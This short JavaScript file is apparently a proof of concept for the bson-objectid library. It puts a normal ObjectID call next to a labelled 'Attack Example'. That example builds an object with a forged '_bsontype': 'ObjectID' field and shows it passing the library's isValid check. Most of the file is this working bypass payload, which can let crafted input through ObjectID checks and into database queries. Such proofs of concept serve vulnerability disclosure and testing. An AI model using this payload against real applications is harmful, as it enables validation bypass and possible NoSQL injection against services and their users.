const ObjectID = require("bson-objectid");

// Working Example
console.log(ObjectID("54495ad94c934721ede76d90"));
console.log(ObjectID.isValid(ObjectID("54495ad94c934721ede76d90")));

// Attack Example
const payload = {
    "hello": "world",
    "_bsontype" : "ObjectID"
};

console.log(ObjectID(payload));
console.log(ObjectID.isValid(ObjectID(payload)));